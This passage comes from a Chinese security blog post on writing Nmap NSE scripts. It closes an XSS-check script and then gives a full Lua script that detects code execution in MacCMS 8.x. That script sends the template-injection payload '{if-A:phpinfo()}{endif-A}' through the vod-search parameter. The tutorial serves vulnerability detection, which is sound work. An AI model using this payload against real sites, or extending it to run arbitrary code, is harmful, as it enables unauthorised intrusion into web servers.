<span class="keyword">if</span> response.<span class="built_in">status</span> <span class="keyword">and</span> response.body </span><br><span class="line">   <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> response.<span class="built_in">status</span> == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">string</span>.<span class="built_in">find</span>(response.body,FLAG) ~= <span class="literal">nil</span>  <span class="comment">-- 如果写入alert字段，说明漏洞存在</span></span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">      <span class="built_in">table</span>.<span class="built_in">insert</span>(table_input,<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"Final Results: %s"</span>,xss_exit))</span><br><span class="line">		<span class="keyword">return</span> stdnse.format_output(<span class="literal">true</span>, table_input)</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">      <span class="built_in">table</span>.<span class="built_in">insert</span>(table_input,<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"Final Results: %s"</span>,xss_not_exit))</span><br><span class="line">		<span class="keyword">return</span> stdnse.format_output(<span class="literal">true</span>, table_input)</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>结果如下（保存有xml的输出格式）：</p>
<p><img src="http://owv5lapar.bkt.clouddn.com/xml3.png" alt="xml3"></p>
<p><img src="http://owv5lapar.bkt.clouddn.com/zzcms8.png" alt="zzcms8"></p>
<hr>
<h4 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h4><p>自己也试着写了一个检测maccms8.x命令执行的nse脚本：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">"http"</span></span><br><span class="line"><span class="keyword">local</span> shortport = <span class="built_in">require</span> <span class="string">"shortport"</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">string</span> = <span class="built_in">require</span> <span class="string">"string"</span></span><br><span class="line"><span class="keyword">local</span> stdnse = <span class="built_in">require</span> <span class="string">"stdnse"</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">table</span> = <span class="built_in">require</span> <span class="string">"table"</span></span><br><span class="line"></span><br><span class="line">description = <span class="string">[[</span></span><br><span class="line"><span class="string">    Detecting the code execution in maccms8.x</span></span><br><span class="line"><span class="string">]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">-- @usage</span></span><br><span class="line"><span class="comment">-- nmap --script maccms-code-execute -p 80 &lt;target&gt;</span></span><br><span class="line"><span class="comment">-- nmap --script maccms-code-execute -p 80 --script-args maccms-code-execute.url-path='/website' &lt;target&gt;</span></span><br><span class="line"><span class="comment">-- nmap --script maccms-code-execute -p 80 --script-args maccms-code-execute.url-path='/maccms' 1.1.1.1</span></span><br><span class="line"><span class="comment">-- @output</span></span><br><span class="line"><span class="comment">-- PORT    STATE  SERVICE</span></span><br><span class="line"><span class="comment">-- 80/tcp  open   http</span></span><br><span class="line"><span class="comment">-- | maccms-code-execute:</span></span><br><span class="line"><span class="comment">-- | Final Results: Code execution exists</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">-- Version 0.1</span></span><br><span class="line"><span class="comment">-- Created 25/3/2018 - v0.1 - created by Mochazz &lt;http://www.sec-redclub.com/&gt;</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"HongRi Mochazz"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See http://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123;<span class="string">"default"</span>,<span class="string">"safe"</span>,<span class="string">"discovery"</span>,<span class="string">"version"</span>&#125;</span><br><span class="line"></span><br><span class="line">portrule = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">    <span class="keyword">return</span> port.protocol == <span class="string">"tcp"</span> <span class="keyword">and</span> port.state == <span class="string">"open"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> FLAG = <span class="string">"phpinfo"</span></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host,port)</span></span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Port\tState\tService\tProtocol"</span>)</span><br><span class="line">    <span class="built_in">print</span>(port.number..<span class="string">"\t"</span>..port.state..<span class="string">"\t"</span>..port.service..<span class="string">"\t"</span>..port.protocol)</span><br><span class="line">    <span class="keyword">local</span> table_input = &#123;&#125;</span><br><span class="line">    <span class="keyword">local</span> code_execute_exit = <span class="string">"code execution exists in this maccms8.x"</span></span><br><span class="line">    <span class="keyword">local</span> code_execute_no_exit = <span class="string">"code execution not exists in  this maccms8.x"</span></span><br><span class="line">    <span class="keyword">local</span> base_path = stdnse.get_script_args(SCRIPT_NAME .. <span class="string">".url-path"</span>)</span><br><span class="line">    <span class="keyword">if</span> base_path ~= <span class="literal">nil</span></span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            base_path = base_path..<span class="string">"/index.php?m=vod-search&amp;wd=&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;"</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            base_path = <span class="string">"/index.php?m=vod-search&amp;wd=&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"You request url is: "</span>..port.service..<span class="string">"://"</span>..host.ip..base_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> options = &#123;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            [<span class="string">"Cookie"</span>] = <span class="string">"PHPSESSID=0hjk7jh06u4hkdnf55qq059le1"</span>,</span><br><span class="line">            [<span class="string">"Host"</span>] = host.name,</span><br><span class="line">            [<span class="string">"Upgrade-Insecure-Requests"</span>] = <span class="number">1</span>,</span><br><span class="line">            [<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> response = http.get(host,port,base_path)</span><br><span class="line">    <span class="comment">-- print(response.body)</span></span><br><span class="line">    <span class="keyword">if</span> response.<span class="built_in">status</span> == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">string</span>.<span class="built_in">find</span>(response.body,FLAG) ~= <span class="literal">nil</span></span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(table_input,<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"Result: %s"</span>,code_execute_exit))</span><br><span class="line">            <span class="keyword">return</span> stdnse.format_output(<span class="literal">true</span>,table_input)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">table</span>.<span class="built_in">insert</span>(table_input,<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"Result: %s"</span>,code_execute_no_exit))</span><br><span class="line">            <span class="keyword">return</span> stdnse.format_output(<span class="literal">true</span>,table_input)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>检测效果图：</p>
<p><img src="/img/dedecms/17.gif" alt="17"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Mochazz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://mochazz.github.io/2018/03/28/Nmap渗透测试精通指南/">https://mochazz.github.io/2018/03/28/Nmap渗透测试精通指南/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://mochazz.github.io">Mochazz's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/工具使用/">工具使用</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/03/29/dedecms最新后台getshell/"><i class="fa fa-chevron-left">  </i><span>代码审计之织梦最新版后台代码注入</span></a></div><div class="next-post pull-right"><a href="/2018/03/14/没有concat的updatexml注入/"><span>禁用concat的updatexml注入</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/backgroud.jpeg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By Mochazz</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>